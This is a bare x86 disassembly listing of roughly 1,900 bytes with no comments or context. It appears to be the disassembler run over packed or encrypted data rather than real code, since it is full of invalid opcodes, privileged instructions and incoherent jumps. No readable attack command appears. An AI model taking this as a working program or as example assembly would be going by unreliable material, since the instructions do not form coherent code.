  4117f7:	dec    eax
  4117f8:	add    DWORD PTR ds:0xa1dcfeef,esp
  4117fe:	xor    dh,BYTE PTR [eax+0x3b]
  411801:	mov    eax,0x92082bef
  411806:	test   al,0xee
  411808:	dec    edi
  411809:	sub    al,0x4
  41180b:	add    edi,0xfffffff1
  41180e:	ror    esi,cl
  411810:	sub    eax,0x2d5d4cb1
  411815:	xchg   ecx,eax
  411816:	int3   
  411817:	repnz push ebp
  411819:	add    eax,0x434bf27e
  41181e:	sub    eax,esp
  411820:	and    cl,BYTE PTR [ebp+0x52844071]
  411826:	stos   DWORD PTR es:[edi],eax
  411827:	(bad)  
  411828:	(bad)  [eax+esi*4]
  41182b:	or     bl,BYTE PTR [eax-0x2ec87f20]
  411831:	nop
  411832:	test   DWORD PTR [eax+eiz*4-0x57],edi
  411836:	push   DWORD PTR [edi]
  411838:	outs   dx,DWORD PTR ds:[esi]
  411839:	sub    esi,edx
  41183b:	fld    DWORD PTR [esi+0x1e361b00]
  411841:	lds    ebp,FWORD PTR [ecx]
  411843:	jne    0x411834
  411845:	aas    
  411846:	pop    ebp
  411847:	push   ebx
  411848:	dec    edi
  411849:	xor    al,bh
  41184b:	mov    esi,eax
  41184d:	outs   dx,BYTE PTR ds:[esi]
  41184e:	mov    edi,0xf2b38b05
  411853:	jecxz  0x41182c
  411855:	push   esp
  411856:	aam    0x58
  411858:	pop    esi
  411859:	test   DWORD PTR [edx],edx
  41185b:	add    dl,dl
  41185d:	mov    ebp,0xe9a71ff6
  411862:	cdq    
  411863:	jnp    0x41189f
  411865:	fstp   TBYTE PTR [edi+0x7a851f07]
  41186b:	ror    BYTE PTR fs:[ebp+0x4b53a7df],0xfd
  411873:	add    BYTE PTR [ebx+0x113842b6],dl
  411879:	stos   BYTE PTR es:[edi],al
  41187a:	dec    ecx
  41187b:	sbb    ah,bl
  41187d:	cdq    
  41187e:	adc    BYTE PTR [edi-0x54],al
  411881:	xchg   ecx,eax
  411882:	xchg   esi,eax
  411883:	push   cs
  411884:	imul   ebx,DWORD PTR [edx-0x30187256],0x457fcbed
  41188e:	sub    ebp,DWORD PTR [ecx+0x19]
  411891:	adc    eax,0x99cc4ec6
  411896:	cmp    BYTE PTR [ebp-0x2e038a53],0xa0
  41189d:	arpl   WORD PTR ds:0x35eb5c4d,sp
  4118a3:	mul    cl
  4118a5:	pop    esi
  4118a6:	mov    bh,0x99
  4118a8:	adc    DWORD PTR [ecx+0x3dc90ae],0xfffffffd
  4118af:	mov    ebx,0x7b063788
  4118b4:	bnd jbe 0x411907
  4118b7:	dec    ebp
  4118b8:	ret    
  4118b9:	and    esi,esi
  4118bb:	jno    0x411845
  4118bd:	and    ah,BYTE PTR [esi+0x47]
  4118c0:	inc    edx
  4118c1:	pop    ebx
  4118c2:	or     DWORD PTR [edi+0x41128bd5],ebx
  4118c8:	dec    ebp
  4118c9:	cdq    
  4118ca:	ret    
  4118cb:	push   ds
  4118cc:	lahf   
  4118cd:	jle    0x41191a
  4118cf:	cli    
  4118d0:	pop    ecx
  4118d1:	test   al,0xb4
  4118d3:	jo     0x41192e
  4118d5:	aas    
  4118d6:	(bad)  
  4118d7:	mov    cl,0x51
  4118d9:	stos   DWORD PTR es:[edi],eax
  4118da:	inc    ecx
  4118db:	mov    dl,0x2f
  4118dd:	push   cs
  4118de:	daa    
  4118df:	fs adc eax,0x9cf71a0c
  4118e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118e6:	mov    fs,WORD PTR [esi-0x4f]
  4118e9:	jmp    0xcb6b:0xd6492328
  4118f0:	sahf   
  4118f1:	adc    BYTE PTR [edx-0xc],ch
  4118f4:	fld    DWORD PTR [ebp+0xc43e03b]
  4118fa:	mov    bl,0x95
  4118fc:	clc    
  4118fd:	or     eax,ecx
  4118ff:	inc    edx
  411900:	aad    0xa6
  411902:	adc    ah,BYTE PTR [ebx+edx*2]
  411905:	fcomp  DWORD PTR [ebx+0x2d]
  411908:	sbb    eax,0x4de5e93a
  41190d:	(bad)  
  41190e:	stc    
  41190f:	fs dec esp
  411911:	cs push 0x49
  411914:	cmp    BYTE PTR [esi],dl
  411916:	push   ss
  411917:	das    
  411918:	stc    
  411919:	(bad)  [esp+eax*8]
  41191c:	sub    ah,BYTE PTR [ebx-0x7763dc26]
  411922:	test   BYTE PTR [edi+ecx*1-0x114ec96],0xd0
  41192a:	jne    0x4118ef
  41192c:	popa   
  41192d:	jb     0x4118cc
  41192f:	popf   
  411930:	pop    ebx
  411931:	ds pop es
  411933:	outs   dx,DWORD PTR ds:[esi]
  411934:	add    al,0xf3
  411936:	outs   dx,BYTE PTR ds:[esi]
  411937:	sbb    eax,esi
  411939:	jle    0x4118fe
  41193b:	ret    
  41193c:	cli    
  41193d:	xchg   DWORD PTR [ebx-0x4397df1a],eax
  411943:	push   ds
  411944:	mov    bh,0xdc
  411946:	mov    ecx,0x1c269645
  41194b:	mov    esi,0xfe089ed5
  411950:	add    al,0x40
  411952:	dec    edx
  411953:	push   esp
  411954:	adc    bh,al
  411956:	aas    
  411957:	icebp  
  411958:	ja     0x411995
  41195a:	js     0x411991
  41195c:	inc    esp
  41195d:	test   eax,0x7247f9c1
  411962:	(bad)  
  411963:	loope  0x411900
  411965:	test   ch,ch
  411967:	sbb    DWORD PTR ds:0xe222942b,edx
  41196d:	and    al,0xfc
  41196f:	pop    ebp
  411970:	out    0xb7,al
  411972:	add    eax,0x79d79f16
  411977:	xchg   DWORD PTR [esi+0x31],ecx
  41197a:	dec    esi
  41197b:	shl    ah,1
  41197d:	jbe    0x4119f9
  41197f:	pushf  
  411980:	mov    al,ds:0xcda4a439
  411985:	or     eax,0x1e53cfff
  41198a:	bound  ebp,QWORD PTR [esi-0x56]
  41198d:	sbb    BYTE PTR [ebp-0x6c],ah
  411990:	shr    ah,1
  411992:	xor    DWORD PTR [edi],ecx
  411994:	xlat   BYTE PTR ds:[ebx]
  411995:	xchg   DWORD PTR [ebx+0x5c],eax
  411998:	ret    0x911c
  41199b:	and    eax,0x2dddd1dd
  4119a0:	(bad)  
  4119a1:	adc    eax,0x631135fc
  4119a6:	(bad)  
  4119a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119a8:	jne    0x4119bf
  4119aa:	xor    al,0x98
  4119ac:	pop    ds
  4119ad:	jne    0x4119cd
  4119af:	jp     0x411a1d
  4119b1:	(bad)  
  4119b2:	cs cwde 
  4119b4:	xor    eax,0xbaaa7471
  4119b9:	fsub   DWORD PTR [eax-0x2a]
  4119bc:	sub    dh,bl
  4119be:	retf   0xc659
  4119c1:	hlt    
  4119c2:	rcl    DWORD PTR [eax],cl
  4119c4:	std    
  4119c5:	js     0x4119c0
  4119c7:	cmp    eax,0x8fa79cfe
  4119cc:	adc    al,0x2d
  4119ce:	jns    0x411965
  4119d0:	or     esp,DWORD PTR [ecx+edi*2+0x5d]
  4119d4:	enter  0xcc9e,0x88
  4119d8:	outs   dx,DWORD PTR ds:[esi]
  4119d9:	fs push eax
  4119db:	pop    es
  4119dc:	add    ah,BYTE PTR [edx+0x13]
  4119df:	pop    edx
  4119e0:	mov    dh,0xe9
  4119e2:	data16 jecxz 0x411a43
  4119e5:	mov    edx,0x63489af3
  4119ea:	xchg   ebp,eax
  4119eb:	xchg   esp,eax
  4119ec:	rol    BYTE PTR [ebp-0xc],cl
  4119ef:	(bad)  
  4119f0:	mov    bl,ah
  4119f2:	cmp    ch,BYTE PTR [ecx+0x10]
  4119f5:	and    BYTE PTR [esi-0x289a9d6c],0x6f
  4119fc:	in     eax,dx
  4119fd:	mov    cl,0xf3
  4119ff:	push   es
  411a00:	push   ecx
  411a01:	repz push edx
  411a03:	pusha  
  411a04:	iret   
  411a05:	pushf  
  411a06:	or     al,BYTE PTR [esi]
  411a08:	shl    bh,cl
  411a0a:	push   ebp
  411a0b:	jae    0x411a45
  411a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a0e:	mov    BYTE PTR [eax-0x6c],dl
  411a11:	sbb    al,0x6b
  411a13:	mov    cl,0xee
  411a15:	xchg   edi,eax
  411a16:	imul   edx,DWORD PTR [edx],0x8ff3f3dd
  411a1c:	test   BYTE PTR [esi],dh
  411a1e:	adc    DWORD PTR [eax-0x62],esp
  411a21:	loopne 0x411a7c
  411a23:	jle    0x4119aa
  411a25:	push   ebx
  411a26:	pop    edx
  411a27:	pop    es
  411a28:	inc    edi
  411a29:	add    eax,0x1bd2ee8b
  411a2e:	jecxz  0x411a3b
  411a30:	rcl    DWORD PTR [eax+ecx*1-0x35],1
  411a34:	iret   
  411a35:	call   0x74e:0x2c70c23e
  411a3c:	cmc    
  411a3d:	sub    ebp,DWORD PTR [ebx+eax*4+0x6864620a]
  411a44:	jne    0x411a6c
  411a46:	inc    esp
  411a47:	mov    WORD PTR [edi+0x364e46a8],fs
  411a4d:	fisttp DWORD PTR [ecx-0xd]
  411a50:	nop
  411a51:	scas   eax,DWORD PTR es:[edi]
  411a52:	lods   eax,DWORD PTR ds:[esi]
  411a53:	pop    ecx
  411a54:	shl    ah,cl
  411a56:	or     DWORD PTR [ebx+0x13],ebx
  411a59:	mov    gs,WORD PTR [edi+0x74543d0a]
  411a5f:	shr    BYTE PTR [eax],0x42
  411a62:	mov    bl,ah
  411a64:	mov    al,0x9e
  411a66:	pop    esi
  411a67:	jbe    0x411abf
  411a69:	pusha  
  411a6a:	in     al,0x6a
  411a6c:	in     eax,0xa7
  411a6e:	(bad)  
  411a6f:	jmp    0xc37e41b3
  411a74:	adc    al,0xe8
  411a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a77:	jbe    0x411a49
  411a79:	jbe    0x411a70
  411a7b:	and    BYTE PTR [eax],al
  411a7d:	jo     0x411a8a
  411a7f:	jmp    0x411afc
  411a81:	mov    edi,DWORD PTR [ebp+0x3b196ed3]
  411a87:	pop    ds
  411a88:	xor    eax,0xaab0b011
  411a8d:	sti    
  411a8e:	adc    al,0xc5
  411a90:	in     al,dx
  411a91:	jle    0x411a6e
  411a93:	and    DWORD PTR [ebx],edi
  411a95:	pop    esi
  411a96:	pop    es
  411a97:	and    esp,DWORD PTR [ebp+0x3e2401b3]
  411a9d:	push   ds
  411a9e:	ins    BYTE PTR es:[edi],dx
  411a9f:	jp     0x411add
  411aa1:	sub    DWORD PTR [ecx-0x2e],ebx
  411aa4:	xchg   DWORD PTR [ecx+0x5c],edx
  411aa7:	mov    ebx,0xae139d59
  411aac:	mov    ds:0xeaf12ab2,eax
  411ab1:	dec    edi
  411ab2:	sbb    al,0x88
  411ab4:	mov    edx,0xccef7c91
  411ab9:	dec    esi
  411aba:	push   eax
  411abb:	push   ebp
  411abc:	cld    
  411abd:	inc    esi
  411abe:	push   ebp
  411abf:	cmp    edi,DWORD PTR [ebx+0x56]
  411ac2:	nop
  411ac3:	dec    ecx
  411ac4:	pop    ds
  411ac5:	loopne 0x411aa4
  411ac7:	iret   
  411ac8:	mov    ds:0xaffffa9f,al
  411acd:	xchg   edx,eax
  411ace:	adc    BYTE PTR [esi+0x481b19b5],bl
  411ad4:	cmp    edi,esp
  411ad6:	(bad)  
  411ad7:	xor    al,0x8
  411ad9:	je     0x411acc
  411adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411adc:	xchg   edx,eax
  411add:	(bad)  
  411ade:	xor    al,0xa4
  411ae0:	pushf  
  411ae1:	mov    bl,BYTE PTR ds:0x52e3f85f
  411ae7:	test   eax,0x9c232ab
  411aec:	lods   eax,DWORD PTR ds:[esi]
  411aed:	adc    DWORD PTR [ebx+edx*4-0x6a],edi
  411af1:	push   ebx
  411af2:	or     BYTE PTR ds:0x78a1dee1,ch
  411af8:	sub    ebx,eax
  411afa:	ja     0x411abe
  411afc:	push   cs
  411afd:	(bad)  
  411afe:	add    dh,BYTE PTR [ebx+0x7514c59a]
  411b04:	cld    
  411b05:	int    0x7c
  411b07:	xor    al,0xbe
  411b09:	pop    eax
  411b0a:	sub    BYTE PTR [esi],dl
  411b0c:	ins    DWORD PTR es:[edi],dx
  411b0d:	(bad)  
  411b0e:	aad    0x22
  411b10:	adc    eax,edx
  411b12:	retf   
  411b13:	outs   dx,DWORD PTR ds:[esi]
  411b14:	repz dec ebx
  411b16:	fnstcw WORD PTR [ecx+0x16]
  411b19:	sub    edx,ebx
  411b1b:	inc    eax
  411b1c:	cmp    BYTE PTR [esp+edi*4+0x7e],bh
  411b20:	sub    DWORD PTR [ecx+0x1e],esp
  411b23:	sbb    al,0x8f
  411b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b26:	add    DWORD PTR [edi],esi
  411b28:	shl    DWORD PTR [edx+0x36],0x80
  411b2c:	cmp    al,0x84
  411b2e:	inc    edi
  411b2f:	xchg   BYTE PTR [ebp-0x25],bh
  411b32:	add    al,0xbe
  411b34:	icebp  
  411b35:	out    0xb4,eax
  411b37:	sahf   
  411b38:	inc    edi
  411b39:	les    ebp,FWORD PTR [ebx-0x5]
  411b3c:	ret    0xebaa
  411b3f:	pop    ebx
  411b40:	inc    esp
  411b41:	add    dl,BYTE PTR ds:0x278733d6
  411b47:	pop    esi
  411b48:	push   edi
  411b49:	imul   ecx,DWORD PTR [ecx-0x1dffe4b6],0x6fb6e536
  411b53:	iret   
  411b54:	out    0x65,eax
  411b56:	rol    BYTE PTR [edx],cl
  411b58:	inc    esp
  411b59:	push   ecx
  411b5a:	call   0x1a655be
  411b5f:	outs   dx,DWORD PTR ds:[esi]
  411b60:	sbb    al,0x1c
  411b62:	fidivr WORD PTR [ebx+esi*8]
  411b65:	pop    ss
  411b66:	sahf   
  411b67:	sub    esp,DWORD PTR [esp+esi*4]
  411b6a:	out    dx,al
  411b6b:	test   BYTE PTR [eax-0x665111a4],dh
  411b71:	vcvtss2sd xmm1,xmm3,DWORD PTR fs:[ecx]
  411b76:	stos   BYTE PTR es:[edi],al
  411b77:	jge    0x411b93
  411b79:	jge    0x411b27
  411b7b:	push   ecx
  411b7c:	cmp    eax,0xf730d8d5
  411b81:	mov    dh,0x40
  411b83:	inc    ebx
  411b84:	cmp    ch,BYTE PTR [eax+0x6c]
  411b87:	cmp    ebp,DWORD PTR [eax-0x34e3a66f]
  411b8d:	or     ecx,DWORD PTR [ebx+0x13]
  411b90:	xchg   edi,eax
  411b91:	xor    esi,esp
  411b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b94:	das    
  411b95:	xchg   ebx,eax
  411b96:	or     bh,bl
  411b98:	fcom   QWORD PTR [eax-0x74]
  411b9b:	int3   
  411b9c:	push   ebp
  411b9d:	aas    
  411b9e:	popa   
  411b9f:	jb     0x411c13
  411ba1:	mov    edx,DWORD PTR [esi-0x7ab3e5ba]
  411ba7:	or     edi,DWORD PTR [esi]
  411ba9:	mov    dl,ah
  411bab:	jb     0x411b40
  411bad:	out    dx,al
  411bae:	or     cl,BYTE PTR [esi+0x8]
  411bb1:	retf   0x79c4
  411bb4:	(bad)  
  411bb6:	das    
  411bb7:	or     ch,BYTE PTR [edx+0x78]
  411bba:	pop    edi
  411bbb:	adc    BYTE PTR [esi],dh
  411bbd:	test   BYTE PTR [esi+0x521c6784],dh
  411bc3:	dec    ebx
  411bc4:	loop   0x411ba9
  411bc6:	shl    BYTE PTR [ecx],0x3c
  411bc9:	test   esi,0xa32529e2
  411bcf:	jo     0x411be7
  411bd1:	dec    esi
  411bd2:	push   0x54adc360
  411bd7:	xlat   BYTE PTR ds:[ebx]
  411bd8:	lahf   
  411bd9:	lods   eax,DWORD PTR ds:[esi]
  411bda:	cmc    
  411bdb:	mov    eax,ds:0x32282727
  411be0:	hlt    
  411be1:	push   esp
  411be2:	mov    eax,DWORD PTR [ebp+0x6e4309f8]
  411be8:	aas    
  411be9:	pusha  
  411bea:	sbb    BYTE PTR [edi],0xd6
  411bed:	dec    eax
  411bee:	aaa    
  411bef:	inc    ebp
  411bf0:	mov    al,0x3b
  411bf2:	lods   eax,DWORD PTR ds:[esi]
  411bf3:	ret    0xc2a0
  411bf6:	(bad)  
  411bf7:	fisubr DWORD PTR [ebx-0x49234cf7]
  411bfd:	xchg   BYTE PTR [ebx-0x3a],bh
  411c00:	mov    esi,DWORD PTR [edi+0x4f]
  411c03:	xor    eax,0xa664fd8c
  411c08:	pushf  
  411c09:	push   esp
  411c0a:	test   DWORD PTR [ecx-0x3d],0x93b5aeb
  411c11:	into   
  411c12:	xlat   BYTE PTR ds:[ebx]
  411c13:	adc    esp,ebx
  411c15:	jmp    0x72c7:0x41564e88
  411c1c:	cmc    
  411c1d:	(bad)  
  411c1e:	mov    edi,0x284a253
  411c23:	push   0x7e
  411c25:	(bad)  
  411c26:	sub    al,0xcd
  411c28:	pop    ds
  411c29:	cs or  eax,0xc026e655
  411c2f:	push   0x6111c0f6
  411c34:	add    eax,0x1eabc3f0
  411c39:	mov    BYTE PTR [edi],dh
  411c3b:	int3   
  411c3c:	dec    eax
  411c3d:	icebp  
  411c3e:	call   0x2bb5:0xec97503d
  411c45:	inc    edi
  411c46:	mov    ebp,0x40ebf8d7
  411c4b:	pusha  
  411c4c:	sub    bh,ch
  411c4e:	dec    ecx
  411c4f:	mov    cl,0x5b
  411c51:	out    dx,al
  411c52:	mov    WORD PTR [esi+ebx*1-0x3e6b6d26],?
  411c59:	jb     0x411c9a
  411c5b:	in     al,0xa8
  411c5d:	mov    ds:0xabddf51a,eax
  411c62:	shr    DWORD PTR [edx-0x2c],1
  411c65:	jecxz  0x411c20
  411c67:	mov    edx,0xc1db6f9f
  411c6c:	pop    es
  411c6d:	pop    ebp
  411c6e:	jnp    0x411cba
  411c70:	hlt    
  411c71:	(bad)  
  411c72:	sahf   
  411c73:	test   al,0xa7
  411c75:	outs   dx,DWORD PTR ds:[esi]
  411c76:	fwait
  411c77:	xor    ch,al
  411c79:	pusha  
  411c7a:	mov    esi,0x2b8da958
  411c7f:	fucom  st(7)
  411c81:	push   esi
  411c82:	inc    ebp
  411c83:	sbb    DWORD PTR [ebp-0x64],edx
  411c86:	add    ah,0xbf
  411c89:	push   eax
  411c8a:	and    ecx,DWORD PTR [ecx]
  411c8c:	scas   eax,DWORD PTR es:[edi]
  411c8d:	call   0xbb519597
  411c92:	inc    ebx
  411c93:	stc    
  411c94:	inc    esp
  411c95:	jge    0x411cd4
  411c97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c98:	imul   eax,DWORD PTR [ebx-0x554f2d02],0x6ad23348
  411ca2:	push   eax
  411ca3:	dec    eax
  411ca4:	push   cs
  411ca5:	lock cmp BYTE PTR [ebp+0x3b],0x4a
  411caa:	cmp    eax,0xae93c8a8
  411caf:	(bad)  
  411cb1:	xor    cl,BYTE PTR [ecx]
  411cb3:	lock jns 0x411c73
  411cb6:	jo     0x411cc0
  411cb8:	retf   0x6bc
  411cbb:	aam    0xf1
  411cbd:	jno    0x411d28
  411cbf:	mov    ch,al
  411cc1:	popf   
  411cc2:	dec    ebx
  411cc3:	ss enter 0xe7de,0x55
  411cc8:	in     eax,0x3c
  411cca:	and    ah,BYTE PTR [ecx-0x66]
  411ccd:	sti    
  411cce:	mov    ebx,DWORD PTR [edi-0x41384b85]
  411cd4:	xor    dl,BYTE PTR [esi-0x2b]
  411cd7:	xchg   ebx,eax
  411cd8:	dec    ecx
  411cd9:	sub    bl,BYTE PTR [ebx]
  411cdb:	jb     0x411cb3
  411cdd:	push   ebp
  411cde:	repz cwde 
  411ce0:	shl    BYTE PTR [edx-0x49],1
  411ce3:	adc    DWORD PTR [edx],ebx
  411ce5:	cmp    edx,DWORD PTR [eax*4-0x1be77e96]
  411cec:	js     0x411d10
  411cee:	shl    DWORD PTR [ecx+0x7402ea61],1
  411cf4:	adc    eax,0xdc991386
  411cf9:	int3   
  411cfa:	xchg   ebp,eax
  411cfb:	sbb    al,0x3e
  411cfd:	cld    
  411cfe:	ret    
  411cff:	and    al,0xeb
  411d01:	add    BYTE PTR [ebp-0x80],cl
  411d04:	fidiv  DWORD PTR [edi-0x4412c160]
  411d0a:	jle    0x411d5a
  411d0c:	mov    edx,0xd49c2b93
  411d11:	dec    edi
  411d12:	xchg   dl,dl
  411d14:	mov    eax,ebp
  411d16:	jbe    0x411ccb
  411d18:	pop    es
  411d19:	pusha  
  411d1a:	inc    esp
  411d1b:	jmp    0x32480363
  411d20:	mov    esi,0x262b7401
  411d25:	mov    edx,0x5dfd6b18
  411d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d2b:	jmp    0x3d6e:0x546fbfc9
  411d32:	push   cs
  411d33:	pop    ecx
  411d34:	lods   al,BYTE PTR ds:[esi]
  411d35:	or     edx,DWORD PTR [edx+eax*2+0x2d]
  411d39:	push   ss
  411d3a:	andps  xmm1,XMMWORD PTR [ebx+0x4d23177f]
  411d41:	dec    esi
  411d42:	inc    ebp
  411d43:	push   ss
  411d44:	cdq    
  411d45:	loope  0x411d70
  411d47:	gs mov edx,0xdc08bec8
  411d4d:	xor    DWORD PTR [edi+0x6a],ebp
  411d50:	mov    ecx,0x5dbdc398
  411d55:	nop
  411d56:	fs push 0x4
  411d59:	or     eax,edx
  411d5b:	divps  xmm0,XMMWORD PTR [ebx-0x7e085f3e]
  411d62:	xor    al,0x15
  411d64:	jb     0x411d2a
  411d66:	sbb    edx,DWORD PTR [ebx+0x71]
  411d69:	xlat   BYTE PTR ds:[ebx]
  411d6a:	jmp    0x411dbe
  411d6c:	or     eax,0x53dd33e3
  411d71:	stos   DWORD PTR es:[edi],eax
  411d72:	inc    eax
  411d73:	fisubr WORD PTR [ebx-0x15e15f5e]
  411d79:	cmp    al,0x7e
  411d7b:	lahf   
  411d7c:	ins    DWORD PTR es:[edi],dx
  411d7d:	jns    0x411d8f
  411d7f:	xlat   BYTE PTR ds:[ebx]
  411d80:	xor    al,0xe9
  411d82:	xchg   ebp,eax
  411d83:	xchg   esi,eax
  411d84:	and    esi,DWORD PTR [esi+ecx*8+0x61]
  411d88:	out    dx,eax
  411d89:	sbb    BYTE PTR [ecx+0x752a2f27],0x5b
  411d90:	add    eax,0xe4d9b400
  411d95:	mov    cl,0x4f
  411d97:	daa    
  411d98:	mov    ds:0xeeb629d5,eax
  411d9d:	dec    edi
  411d9e:	(bad)  
  411d9f:	mov    eax,ds:0xc5fae57b
  411da4:	dec    edx
  411da5:	fidiv  WORD PTR [esi-0x71]
  411da8:	add    eax,0xc02bf31
  411dad:	inc    edx
  411dae:	loop   0x411e13
  411db0:	jbe    0x411d7b
  411db2:	adc    DWORD PTR [edi],0xffffffb4
  411db5:	(bad)  
  411db7:	test   eax,0x96abb0a1
  411dbc:	pushf  
  411dbd:	pop    esp
  411dbe:	aaa    
  411dbf:	clc    
  411dc0:	cld    
  411dc1:	pop    ss
  411dc2:	add    eax,DWORD PTR [esi+ebx*4+0x2b]
  411dc6:	jmp    0xfe3ed455
  411dcb:	dec    edi
  411dcc:	outs   dx,DWORD PTR ds:[esi]
  411dcd:	popf   
  411dce:	jecxz  0x411d77
  411dd0:	fdivr  QWORD PTR [ebp+0x3851e419]
  411dd6:	adc    eax,0xcb77195b
  411ddb:	push   0x19
  411ddd:	xchg   ecx,eax
  411dde:	mov    ecx,0x179fb2a0
  411de3:	mov    ah,0x55
  411de5:	mov    eax,ebx
  411de7:	cwde   
  411de8:	inc    edx
  411de9:	add    cl,BYTE PTR [ebp-0x49c6b5ec]
  411def:	pop    es
  411df0:	cmp    DWORD PTR [esi+0x18],0x15688cc9
  411df7:	mov    WORD PTR [ebx+ebx*1-0x56381d69],gs
  411dfe:	or     eax,0x8f3a199e
  411e03:	or     BYTE PTR [ecx+edi*2+0x4],al
  411e07:	push   ss
  411e08:	push   0xfffffff9
  411e0a:	jle    0x411e35
  411e0c:	pop    ss
  411e0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e0e:	call   0x53acbc05
  411e13:	push   ebp
  411e14:	add    al,bl
  411e16:	in     eax,0xc
  411e18:	loopne 0x411dbd
  411e1a:	jge    0x411de0
  411e1c:	rol    eax,1
  411e1e:	pop    esi
  411e1f:	mov    edx,0x1421097
  411e24:	ja     0x411e48
  411e26:	adc    BYTE PTR [ecx+0x3faba5bf],bl
  411e2c:	aaa    
  411e2d:	retf   0x2f44
  411e30:	test   BYTE PTR [esi+0x18],ch
  411e33:	mov    BYTE PTR [ebx+0x43],al
  411e36:	cmp    esp,0xdc15c304
  411e3c:	inc    esi
  411e3d:	xor    esp,DWORD PTR [edx+0x2d]
  411e40:	stc    
  411e41:	xor    DWORD PTR [edx-0x34c15ac8],ecx
  411e47:	cmp    al,0x91
  411e49:	mov    WORD PTR [esi+0x27],ds
  411e4c:	mov    dl,cl
  411e4e:	mov    eax,0xa8065055
  411e53:	mov    ebp,0x72c7643c
  411e58:	xchg   ebp,eax
  411e59:	push   ss
  411e5a:	cmp    BYTE PTR [edi-0x358611d6],ah
  411e60:	pop    ecx
  411e61:	(bad)  
  411e62:	int    0x62
  411e64:	fcom   QWORD PTR [eax]
  411e66:	mov    ebx,0x26243e23
  411e6b:	mov    ds:0x2e2a22b7,al
  411e70:	loope  0x411eaf
  411e72:	loope  0x411e59
  411e74:	dec    edx
  411e75:	add    eax,0xe9b1ba81
  411e7a:	or     DWORD PTR [esi+0xb],0x6b
  411e7e:	js     0x411e8b
  411e80:	retf   0x1d7d
  411e83:	retf   0x5b82
  411e86:	out    0xda,al
  411e88:	mov    ds,bp
  411e8b:	xchg   ebx,eax
  411e8c:	lahf   
  411e8d:	std    
  411e8e:	mov    esi,0x8bbaca0c
  411e93:	imul   esi,esi,0x2c
  411e96:	or     BYTE PTR [esi+0x486376d1],dh
  411e9c:	repz cmp DWORD PTR [ebp+0x9],esp
  411ea0:	es push edi
  411ea2:	cmp    BYTE PTR [ebx],0x28
  411ea5:	les    esi,FWORD PTR [eax+0x77]
  411ea8:	repz int3 
  411eaa:	mov    eax,ds:0xb92b6b5c
  411eaf:	xor    DWORD PTR [esi-0x34],eax
  411eb2:	mov    al,ds:0xac46ef28
  411eb7:	cmp    esi,DWORD PTR [eax+0x383b036a]
  411ebd:	mov    edx,0x5aad2469
  411ec2:	xor    bh,BYTE PTR [esi-0x4acbc91]
  411ec8:	and    eax,0x51d77681
  411ecd:	loopne 0x411ec1
  411ecf:	out    dx,eax
  411ed0:	dec    edx
  411ed1:	add    cl,BYTE PTR [esi]
  411ed3:	jge    0x411e91
  411ed5:	mov    BYTE PTR [ebx-0x7],bl
  411ed8:	pop    ebx
  411ed9:	lods   eax,DWORD PTR ds:[esi]
  411eda:	pop    es
  411edb:	and    BYTE PTR [edi],0x96
  411ede:	mov    ds:0x648c5495,eax
  411ee3:	pop    edi
  411ee4:	repnz cld 
  411ee6:	pop    ebx
  411ee7:	xlat   BYTE PTR ds:[ebx]
  411ee8:	push   0xffffffa7
  411eea:	mov    ebp,0x2a25f9be
  411eef:	sti    
  411ef0:	ds mov bl,0xf8
  411ef3:	ss push edx
  411ef5:	ftst   
  411ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ef8:	out    0xb5,eax
  411efa:	push   esi
  411efb:	jnp    0x411e90
  411efd:	push   ebx
  411efe:	push   esi
  411eff:	leave  
  411f00:	mov    ecx,0xbdd80d8d
  411f05:	jle    0x411eb4
  411f07:	and    eax,0xf69ce94e
  411f0c:	rol    BYTE PTR [eax],cl
  411f0e:	shl    DWORD PTR [ebp+ecx*2+0x2b],cl
  411f12:	mov    eax,ds:0x5bf27c8c
  411f17:	push   0x5
  411f19:	push   esp
  411f1a:	enter  0x86fc,0x8f
  411f1e:	jmp    0x411f06
  411f20:	aas    
  411f21:	jbe    0x411f26
  411f23:	jns    0x411f52
  411f25:	ret    0x840e
  411f28:	inc    ecx
  411f29:	cmc    
  411f2a:	or     edi,DWORD PTR [eax-0x18]
  411f2d:	and    esp,DWORD PTR [ebp+0x247c41eb]
  411f33:	cli    
  411f34:	or     edi,DWORD PTR [edx-0x4e]
  411f37:	inc    ebp
  411f38:	pop    ebp
  411f39:	rol    sp,cl
  411f3c:	test   eax,0xd0267322
  411f41:	psllq  mm0,QWORD PTR [ebp+edx*2+0x18654e1]
  411f49:	fild   DWORD PTR [ecx-0x520fc23b]
  411f4f:	fisub  DWORD PTR [ecx+esi*2]
  411f52:	rol    BYTE PTR ds:0xd4a22588,1
  411f58:	(bad)  
  411f59:	int    0x2f
  411f5b:	sbb    eax,0x35d96c6f
  411f60:	outs   dx,DWORD PTR ds:[esi]
  411f61:	xor    BYTE PTR [edi],bl
  411f63:	ret    
  411f64:	or     eax,DWORD PTR [esi]
  411f66:	jge    0x411f5d
  411f68:	mov    dh,al
  411f6a:	int3   
  411f6b:	pop    esp
  411f6c:	inc    ebx
  411f6d:	mov    eax,0x520d724b
  411f72:	test   eax,0x48ebaecf
  411f77:	int    0x6e
  411f79:	call   0x68cd3700
  411f7e:	jnp    0x411faa
  411f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f81:	and    al,0x41
  411f83:	inc    ebp
  411f84:	xor    edx,0xffffff87
  411f87:	sahf   
  411f88:	adc    edi,esp
  411f8a:	ja     0x411f19
  411f8c:	or     al,0x45
  411f8e:	jge    0x411fe9
  411f90:	xchg   DWORD PTR [ecx],ebx
  411f92:	inc    eax
  411f93:	pop    ecx
  411f94:	jb     0x411ffb
  411f96:	rcl    DWORD PTR [edi+0x7f4b15a1],1
  411f9c:	mov    ds:0x7089523e,eax
  411fa1:	fs clc 
  411fa3:	(bad)  
  411fa4:	popf   
  411fa5:	leave  
  411fa6:	xor    eax,0x611f1957
  411fab:	neg    DWORD PTR [edi-0x65]
